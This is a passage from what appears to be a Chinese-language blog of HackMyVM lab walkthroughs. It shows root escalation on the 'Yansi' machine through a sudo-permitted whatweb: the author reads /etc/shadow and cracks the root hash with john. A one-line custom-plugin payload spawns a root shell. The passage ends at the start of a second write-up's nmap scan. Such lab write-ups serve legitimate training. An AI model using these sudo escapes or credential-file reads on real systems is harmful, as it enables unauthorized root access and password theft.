class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs shell">ssh google@192.168.56.116<br>The authenticity of host &#x27;192.168.56.116 (192.168.56.116)&#x27; can&#x27;t be established.<br>ED25519 key fingerprint is SHA256:O2iH79i8PgOwV/Kp8ekTYyGMG8iHT+YlWuYC85SbWSQ.<br>This key is not known by any other names.<br>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes<br>Warning: Permanently added &#x27;192.168.56.116&#x27; (ED25519) to the list of known hosts.<br>google@192.168.56.116&#x27;s password: <br>Linux Yansi 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64<br><br>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms for each program are described in the<br>individual files in /usr/share/doc/*/copyright.<br><br>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>Last login: Sun Jun  8 09:54:03 2025 from 192.168.56.104<br>google@Yansi:~$ ls<br>user.txt<br>google@Yansi:~$ cat user.txt <br>flag&#123;user-e93a188c288106b24060679d47cc630f&#125;<br>google@Yansi:~$ <br><br></code></pre></td></tr></table></figure><h3 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h3><hr><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">google@Yansi:~$ sudo -l<br>Matching Defaults entries for google on Yansi:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User google may run the following commands on Yansi:<br>    (ALL) NOPASSWD: /usr/bin/whatweb<br>google@Yansi:~$ <br><br></code></pre></td></tr></table></figure><p>sudo -lçœ‹ä¸€ä¸‹å“ªäº›æ–‡ä»¶å¯ä»¥æ‰§è¡Œï¼Œå‘ç°binç›®å½•ä¸‹æœ‰ä¸€ä¸ªwhatwebã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><code class="hljs shell">google@Yansi:/usr/bin$ sudo whatweb -h<br><br>.$$$     $.                                   .$$$     $.<br><span class="hljs-meta prompt_">$</span><span class="language-bash">$$$     $$. .$$$  $$$ .$$$$$$.  .$$$$$$$$$$. $$$$     $$. .$$$$$$$. .$$$$$$.</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">$$     $$$ $ $$  $$$ $ $$$$$$. $$$$$ $$$$$$ $ $$     $$$ $ $$   $$ $ $$$$$$.</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">`$     $$$ $ `$  $$$ $ `$  $$$ $$<span class="hljs-string">&#x27; $ `$ `$$ $ `$     $$$ $ `$      $ `$  $$$&#x27;</span></span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">. $     $$$ $. $$$$$$ $. $$$$$$ `$  $. $  :<span class="hljs-string">&#x27; $. $     $$$ $. $$$$   $. $$$$$.</span></span><br><span class="hljs-meta prompt_">$</span><span class="language-bash"><span class="hljs-string">::$  .  $$$ $::$  $$$ $::$  $$$     $::$     $::$  .  $$$ $::$      $::$  $$$$</span></span><br><span class="hljs-meta prompt_">$</span><span class="language-bash"><span class="hljs-string">;;$ $$$ $$$ $;;$  $$$ $;;$  $$$     $;;$     $;;$ $$$ $$$ $;;$      $;;$  $$$$</span></span><br><span class="hljs-meta prompt_">$</span><span class="language-bash"><span class="hljs-string">$$$$$ $$$$$ $$$$  $$$ $$$$  $$$     $$$$     $$$$$$ $$$$$ $$$$$$$$$ $$$$$$$$$&#x27;</span></span><br><br><br>WhatWeb - Next generation web scanner version 0.5.5.<br>Developed by Andrew Horton (urbanadventurer) and Brendan Coles (bcoles).<br>Homepage: https://www.morningstarsecurity.com/research/whatweb<br><br>Usage: whatweb [options] &lt;URLs&gt;<br><br>TARGET SELECTION:<br>  &lt;TARGETs&gt;                     Enter URLs, hostnames, IP addresses, filenames or<br>                                IP ranges in CIDR, x.x.x-x, or x.x.x.x-x.x.x.x<br>                                format.<br>  --input-file=FILE, -i         Read targets from a file. You can pipe<br>                                hostnames or URLs directly with -i /dev/stdin.<br><br>TARGET MODIFICATION:<br>  --url-prefix                  Add a prefix to target URLs.<br>  --url-suffix                  Add a suffix to target URLs.<br>  --url-pattern                 Insert the targets into a URL.<br>                                e.g. example.com/%insert%/robots.txt<br><br>AGGRESSION:<br>The aggression level controls the trade-off between speed/stealth and<br>reliability.<br>  --aggression, -a=LEVEL        Set the aggression level. Default: 1.<br>  1. Stealthy                   Makes one HTTP request per target and also<br>                                follows redirects.<br>  3. Aggressive                 If a level 1 plugin is matched, additional<br>                                requests will be made.<br>  4. Heavy                      Makes a lot of HTTP requests per target. URLs<br>                                from all plugins are attempted.<br><br>HTTP OPTIONS:<br>  --user-agent, -U=AGENT        Identify as AGENT instead of WhatWeb/0.5.5.<br>  --header, -H                  Add an HTTP header. eg &quot;Foo:Bar&quot;. Specifying a<br>                                default header will replace it. Specifying an<br>                                empty value, e.g. &quot;User-Agent:&quot; will remove it.<br>  --follow-redirect=WHEN        Control when to follow redirects. WHEN may be<br>                                `never&#x27;, `http-only&#x27;, `meta-only&#x27;, `same-site&#x27;,<br>                                or `always&#x27;. Default: always.<br>  --max-redirects=NUM           Maximum number of redirects. Default: 10.<br><br>AUTHENTICATION:<br>  --user, -u=&lt;user:password&gt;    HTTP basic authentication.<br>  --cookie, -c=COOKIES          Use cookies, e.g. &#x27;name=value; name2=value2&#x27;.<br>  --cookie-jar=FILE             Read cookies from a file.<br><br>PROXY:<br>  --proxy                       &lt;hostname[:port]&gt; Set proxy hostname and port.<br>                                Default: 8080.<br>  --proxy-user                  &lt;username:password&gt; Set proxy user and password.<br><br>PLUGINS:<br>  --list-plugins, -l            List all plugins.<br>  --info-plugins, -I=[SEARCH]   List all plugins with detailed information.<br>                                Optionally search with keywords in a comma<br>                                delimited list.<br>  --search-plugins=STRING       Search plugins for a keyword.<br>  --plugins, -p=LIST            Select plugins. LIST is a comma delimited set<br>                                of selected plugins. Default is all.<br>                                Each element can be a directory, file or plugin<br>                                name and can optionally have a modifier, +/-.<br>                                Examples: +/tmp/moo.rb,+/tmp/foo.rb<br>                                title,md5,+./plugins-disabled/<br>                                ./plugins-disabled,-md5<br>                                -p + is a shortcut for -p +plugins-disabled.<br>  --grep, -g=STRING|REGEXP      Search for STRING or a Regular Expression. Shows<br>                                only the results that match.<br>                                Examples: --grep &quot;hello&quot;<br>                                --grep &quot;/he[l]*o/&quot;<br>  --custom-plugin=DEFINITION    Define a custom plugin named Custom-Plugin,<br>                                Examples: &quot;:text=&gt;&#x27;powered by abc&#x27;&quot;<br>                                &quot;:version=&gt;/powered[ ]?by ab[0-9]/&quot;<br>                                &quot;:ghdb=&gt;&#x27;intitle:abc \&quot;powered by abc\&quot;&#x27;&quot;<br>                                &quot;:md5=&gt;&#x27;8666257030b94d3bdb46e05945f60b42&#x27;&quot;<br>                                &quot;&#123;:text=&gt;&#x27;powered by abc&#x27;&#125;&quot;<br>  --dorks=PLUGIN                List Google dorks for the selected plugin.<br><br>OUTPUT:<br>  --verbose, -v                 Verbose output includes plugin descriptions.<br>                                Use twice for debugging.<br>  --colour,--color=WHEN         control whether colour is used. WHEN may be<br>                                `never&#x27;, `always&#x27;, or `auto&#x27;.<br>  --quiet, -q                   Do not display brief logging to STDOUT.<br>  --no-errors                   Suppress error messages.<br><br>LOGGING:<br>  --log-brief=FILE              Log brief, one-line output.<br>  --log-verbose=FILE            Log verbose output.<br>  --log-errors=FILE             Log errors.<br>  --log-xml=FILE                Log XML format.<br>  --log-json=FILE               Log JSON format.<br>  --log-sql=FILE                Log SQL INSERT statements.<br>  --log-sql-create=FILE         Create SQL database tables.<br>  --log-json-verbose=FILE       Log JSON Verbose format.<br>  --log-magictree=FILE          Log MagicTree XML format.<br>  --log-object=FILE             Log Ruby object inspection format.<br>  --log-mongo-database          Name of the MongoDB database.<br>  --log-mongo-collection        Name of the MongoDB collection.<br>                                Default: whatweb.<br>  --log-mongo-host              MongoDB hostname or IP address.<br>                                Default: 0.0.0.0.<br>  --log-mongo-username          MongoDB username. Default: nil.<br>  --log-mongo-password          MongoDB password. Default: nil.<br>  --log-elastic-index           Name of the index to store results. Default: whatweb<br>  --log-elastic-host            Host:port of the elastic http interface. Default: 127.0.0.1:9200<br><br>PERFORMANCE &amp; STABILITY:<br>  --max-threads, -t             Number of simultaneous threads. Default: 25.<br>  --open-timeout                Time in seconds. Default: 15.<br>  --read-timeout                Time in seconds. Default: 30.<br>  --wait=SECONDS                Wait SECONDS between connections.<br>                                This is useful when using a single thread.<br><br>HELP &amp; MISCELLANEOUS:<br>  --short-help                  Short usage help.<br>  --help, -h                    Complete usage help.<br>  --debug                       Raise errors in plugins.<br>  --version                     Display version information.<br><br>EXAMPLE USAGE:<br>* Scan example.com.<br>  ./whatweb example.com<br><br>* Scan reddit.com slashdot.org with verbose plugin descriptions.<br>  ./whatweb -v reddit.com slashdot.org<br><br>* An aggressive scan of wired.com detects the exact version of WordPress.<br>  ./whatweb -a 3 www.wired.com<br><br>* Scan the local network quickly and suppress errors.<br>  whatweb --no-errors 192.168.0.0/24<br><br>* Scan the local network for https websites.<br>  whatweb --no-errors --url-prefix https:// 192.168.0.0/24<br><br>* Scan for crossdomain policies in the Alexa Top 1000.<br>  ./whatweb -i plugin-development/alexa-top-100.txt \<br>  --url-suffix /crossdomain.xml -p crossdomain_xml<br><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬çœ‹åˆ°å¯ä»¥ç”¨iè¯»å–æ–‡ä»¶ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">google@Yansi:/usr/bin$ sudo whatweb -i /root/root.txt<br>Unable to parse invalid target : Invalid character in host: &#x27;flag&#123;root-594359512f516a5f9c80930b6c388d10&#125;&#x27;<br>No targets selected<br><br></code></pre></td></tr></table></figure><p>ä½†è¿™è¿˜ä¸ç®—å®Œï¼Œæˆ‘ä»¬è¿˜æ²¡æœ‰æ‹¿åˆ°rootçš„shellã€‚</p><p>æ—¢ç„¶å¯ä»¥ç”¨iè¯»æ–‡ä»¶ï¼Œé‚£è‡ªç„¶æƒ³åˆ°è¯»shadowã€‚</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs nix">google@Yansi:<span class="hljs-operator">/</span>usr<span class="hljs-operator">/</span>bin$ sudo whatweb <span class="hljs-operator">-</span>i <span class="hljs-symbol">/etc/shadow</span><br>Unable to parse invalid <span class="hljs-params">target :</span> Invalid port <span class="hljs-params">number:</span> <span class="hljs-string">&quot;&quot;</span><br>Unable to parse invalid <span class="hljs-params">target :</span> Invalid port <span class="hljs-params">number:</span> <span class="hljs-string">&quot;&quot;</span><br>Unable to parse invalid <span class="hljs-params">target :</span> Invalid port <span class="hljs-params">number:</span> <span class="hljs-string">&quot;&quot;</span><br>Unable to parse invalid <span class="hljs-params">target :</span> Invalid port <span class="hljs-params">number:</span> <span class="hljs-string">&quot;&quot;</span><br>Unable to parse invalid <span class="hljs-params">target :</span> Invalid port <span class="hljs-params">number:</span> <span class="hljs-string">&quot;&quot;</span><br>Unable to parse invalid <span class="hljs-params">target :</span> Invalid port <span class="hljs-params">number:</span> <span class="hljs-string">&quot;&quot;</span><br>Unable to parse invalid <span class="hljs-params">target :</span> Invalid port <span class="hljs-params">number:</span> <span class="hljs-string">&quot;&quot;</span><br>Unable to parse invalid <span class="hljs-params">target :</span> Invalid port <span class="hljs-params">number:</span> <span class="hljs-string">&quot;&quot;</span><br>Unable to parse invalid <span class="hljs-params">target :</span> Invalid port <span class="hljs-params">number:</span> <span class="hljs-string">&quot;&quot;</span><br>Unable to parse invalid <span class="hljs-params">target :</span> Invalid port <span class="hljs-params">number:</span> <span class="hljs-string">&quot;&quot;</span><br>Unable to parse invalid <span class="hljs-params">target :</span> Invalid port <span class="hljs-params">number:</span> <span class="hljs-string">&quot;&quot;</span><br>Unable to parse invalid <span class="hljs-params">target :</span> Invalid port <span class="hljs-params">number:</span> <span class="hljs-string">&quot;&quot;</span><br>Unable to parse invalid <span class="hljs-params">target :</span> Invalid port <span class="hljs-params">number:</span> <span class="hljs-string">&quot;&quot;</span><br>Unable to parse invalid <span class="hljs-params">target :</span> Invalid port <span class="hljs-params">number:</span> <span class="hljs-string">&quot;&quot;</span><br>Unable to parse invalid <span class="hljs-params">target :</span> Invalid port <span class="hljs-params">number:</span> <span class="hljs-string">&quot;&quot;</span><br>Unable to parse invalid <span class="hljs-params">target :</span> Invalid port <span class="hljs-params">number:</span> <span class="hljs-string">&quot;&quot;</span><br>Unable to parse invalid <span class="hljs-params">target :</span> Invalid port <span class="hljs-params">number:</span> <span class="hljs-string">&quot;&quot;</span><br>Unable to parse invalid <span class="hljs-params">target :</span> Invalid port <span class="hljs-params">number:</span> <span class="hljs-string">&quot;&quot;</span><br>Unable to parse invalid <span class="hljs-params">target :</span> Invalid port <span class="hljs-params">number:</span> <span class="hljs-string">&quot;&quot;</span><br>Unable to parse invalid <span class="hljs-params">target :</span> Invalid port <span class="hljs-params">number:</span> <span class="hljs-string">&quot;&quot;</span><br>Unable to parse invalid <span class="hljs-params">target :</span> Invalid port <span class="hljs-params">number:</span> <span class="hljs-string">&quot;&quot;</span><br>Unable to parse invalid <span class="hljs-params">target :</span> Invalid port <span class="hljs-params">number:</span> <span class="hljs-string">&quot;&quot;</span><br>Unable to parse invalid <span class="hljs-params">target :</span> Invalid port <span class="hljs-params">number:</span> <span class="hljs-string">&quot;&quot;</span><br>Unable to parse invalid <span class="hljs-params">target :</span> Invalid port <span class="hljs-params">number:</span> <span class="hljs-string">&quot;&quot;</span><br>Unable to parse invalid <span class="hljs-params">target :</span> Invalid port <span class="hljs-params">number:</span> <span class="hljs-string">&quot;$6$0Eykzb257cANR9sU$mH05O99a8NTNnSBx6j&quot;</span><br>Unable to parse invalid <span class="hljs-params">target :</span> Invalid port <span class="hljs-params">number:</span> <span class="hljs-string">&quot;&quot;</span><br>Prepare Target Failed <span class="hljs-operator">-</span> Invalid port <span class="hljs-params">number:</span> <span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>ä½†æ˜¯è¯»çš„æ–‡ä»¶å¹¶ä¸å…¨ï¼Œè¿™æ—¶æŸ¥é˜…whatwebçš„æ–‡æ¡£ï¼Œå‘ç°å®ƒè¿˜æä¾›äº†ä¸€ä¸ªæ‰§è¡Œæœ¬åœ°æ’ä»¶çš„åŠŸèƒ½ï¼Œä¾æ­¤æˆ‘ä»¬èƒ½åˆ©ç”¨çš„ç‚¹å°±å¾ˆå¤šäº†ã€‚</p><p>é¦–å…ˆæ˜¯ç”¨pluginè¯»shadowã€‚</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs subunit"><span class="hljs-keyword">Error </span>loading plugin /etc/shadow. Error details: /etc/shadow:1: syntax error, unexpected &#x27;:&#x27;, expecting end-of-input<br>root:sbSGfTY5rMGMg:20247:0:99999:7:::                                                                               <br>No plugins selected, exiting.<br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Desktop]<br>â””â”€# echo &quot;sbSGfTY5rMGMg&quot; &gt; <span class="hljs-number">1.</span>txt                <br>                                                                                                                                                           <br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Desktop]<br>â””â”€# john <span class="hljs-number">1.</span>txt <span class="hljs-comment">--wordlist=/home/kali/Desktop/rockyou.txt</span><br><span class="hljs-keyword">Using</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">input</span> <span class="hljs-keyword">encoding</span>: UTF<span class="hljs-number">-8</span><br>Loaded <span class="hljs-number">1</span> <span class="hljs-keyword">password</span> hash (descrypt, traditional crypt(<span class="hljs-number">3</span>) [DES <span class="hljs-number">128</span>/<span class="hljs-number">128</span> AVX])<br>Will run <span class="hljs-number">4</span> OpenMP threads<br>Press <span class="hljs-string">&#x27;q&#x27;</span> <span class="hljs-keyword">or</span> Ctrl-C <span class="hljs-keyword">to</span> <span class="hljs-keyword">abort</span>, almost <span class="hljs-keyword">any</span> other key <span class="hljs-keyword">for</span> status<br>juicybab         (?)     <br><span class="hljs-number">1</span>g <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> DONE (<span class="hljs-number">2025</span><span class="hljs-number">-06</span><span class="hljs-number">-08</span> <span class="hljs-number">11</span>:<span class="hljs-number">08</span>) <span class="hljs-number">33.33</span>g/s <span class="hljs-number">7372</span>Kp/s <span class="hljs-number">7372</span>Kc/s <span class="hljs-number">7372</span>KC/s luckycat..calor<br>Use the &quot;--show&quot; <span class="hljs-keyword">option</span> <span class="hljs-keyword">to</span> display <span class="hljs-keyword">all</span> <span class="hljs-keyword">of</span> the cracked passwords reliably<br><span class="hljs-keyword">Session</span> completed. <br></code></pre></td></tr></table></figure><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir">google<span class="hljs-variable">@Yansi</span><span class="hljs-symbol">:/usr/bin</span><span class="hljs-variable">$ </span>su root<br><span class="hljs-symbol">Password:</span> <br>root<span class="hljs-variable">@Yansi</span><span class="hljs-symbol">:/usr/bin</span><span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><p>æˆåŠŸæ‹¿åˆ°rootçš„shellã€‚</p><p>è¿˜æœ‰ä¸€ç§æ–¹æ³•æ˜¯ç›´æ¥åˆ©ç”¨whatwebçš„è‡ªå®šä¹‰æ’ä»¶åŠŸèƒ½ï¼Œèµ·ä¸€ä¸ªbashè¿‡å»ã€‚</p><p>ï¼ˆæ²¡å†™è¿‡rubyï¼Œè¿™é‡Œæ¯›çš„ç¾¤å‹çš„ä¸€å¥è¯ææƒè„šæœ¬ï¼‰</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">google@Yansi:~$ sudo whatweb --custom-plugin=&quot;&#123;:name=&gt;&#x27;Malicious&#x27;, :version=&gt;//, :string =&gt; (system(&#x27;/bin/sh&#x27;) rescue nil)&#125;&quot;<br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">id</span></span><br>uid=0(root) gid=0(root) groups=0(root)<br></code></pre></td></tr></table></figure><p>å¦‚æœæƒ³è¦æ­£è§„çš„å†™æ³•å¯ä»¥å‚é˜…whatwebçš„æ–‡æ¡£ã€‚</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-comment">##</span><br><span class="hljs-comment"># This file is part of WhatWeb and may be subject to</span><br><span class="hljs-comment"># redistribution and commercial restrictions. Please see the WhatWeb</span><br><span class="hljs-comment"># web site for more information on licensing and terms of use.</span><br><span class="hljs-comment"># https://morningstarsecurity.com/research/whatweb</span><br><span class="hljs-comment">#</span><br>Plugin.define do<br>name <span class="hljs-string">&quot;Plugin-Tutorial-1&quot;</span><br>authors [<br><span class="hljs-string">&quot;Your preferred name &lt;email@address&gt;&quot;</span>, <span class="hljs-comment"># v0.1 # 2019-01-01 # Created plugin</span><br>]<br>version <span class="hljs-string">&quot;0.1&quot;</span><br>description <span class="hljs-string">&quot;Generic CMS is an open-source Content Management System developed in PHP.&quot;</span><br>website <span class="hljs-string">&quot;http://example.com/&quot;</span><br><br><span class="hljs-comment"># This is the matches array. </span><br><span class="hljs-comment"># Each match is treated independently.</span><br><br><span class="hljs-comment"># Matches #</span><br>matches [<br><span class="hljs-comment"># This searches for a text string.</span><br>&#123; <span class="hljs-meta">:text</span> <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-string">&quot;This page was generated by &lt;b&gt;Generic CMS&lt;/b&gt;&quot;</span> &#125;,<br><br><span class="hljs-comment"># This searches for a regular expression. Note that the slashes are escaped.</span><br>&#123; <span class="hljs-meta">:regexp</span> <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-symbol">/This</span> page was generated by <span class="hljs-operator">&lt;</span>a href<span class="hljs-operator">=</span><span class="hljs-string">&quot;http:<span class="hljs-char escape_">\/</span><span class="hljs-char escape_">\/</span>www.genericcms.com<span class="hljs-char escape_">\/</span>en<span class="hljs-char escape_">\/</span>products<span class="hljs-char escape_">\/</span>generic-cms<span class="hljs-char escape_">\/</span>&quot;</span><span class="hljs-operator">&gt;</span>Generic CMS<span class="hljs-operator">&lt;</span>\<span class="hljs-operator">/</span>a<span class="hljs-operator">&gt;</span><span class="hljs-symbol">/</span> &#125;,<br><br><span class="hljs-comment"># This extracts the version of Generic CMS from the Mega generator tag.</span><br>&#123; <span class="hljs-meta">:name</span> <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-string">&quot;Meta generator&quot;</span>,  <span class="hljs-meta">:version</span> <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-operator">/</span><span class="hljs-operator">&lt;</span>meta name<span class="hljs-operator">=</span><span class="hljs-string">&quot;generator&quot;</span> content<span class="hljs-operator">=</span><span class="hljs-string">&quot;Generic CMS version ([a-z0-9])+/ &#125;,</span><br><span class="hljs-string">] </span><br><span class="hljs-string"></span><br><span class="hljs-string">end</span><br></code></pre></td></tr></table></figure><p>åœ¨ä¸­é—´åŠ å…¥ä¸Šé¢çš„chmod+x &#x2F;bin&#x2F;bashå³å¯ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>æ¸—é€</tag>
      
      <tag>HVM</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HackMyVM-Mixue</title>
    <link href="/2025/06/02/HackMyVM-Mixue/"/>
    <url>/2025/06/02/HackMyVM-Mixue/</url>
    
    <content type="html"><![CDATA[<p>ä¾æ—§æ˜¯ç¾¤å‹é¶æœºï¼Œæ‹¿åˆ°äº†userflagã€‚</p><h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><hr><p>é¶æœºIPï¼š192.168.56.111</p><p>nmapæ‰«æï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -T4 -A -v 192.168.56.111<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-02 10:57 EDT<br>NSE: Loaded 156 scripts <span class="hljs-keyword">for</span> scanning.<br>NSE: Script Pre-scanning.<br>Initiating NSE at 10:57<br>Completed NSE at 10:57, 0.00s elapsed<br>Initiating NSE at 